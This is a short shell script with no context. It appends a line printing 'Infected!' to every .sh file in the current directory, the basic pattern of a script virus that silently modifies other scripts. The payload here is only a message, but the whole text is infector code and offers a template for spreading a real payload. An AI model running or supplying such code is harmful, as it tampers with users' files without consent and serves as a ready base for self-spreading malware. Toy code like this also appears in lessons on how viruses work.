scrlst=$(ls *.sh)
for item in $scrlst
do
    echo -e "\necho \"Infected!\"" >> $item
done
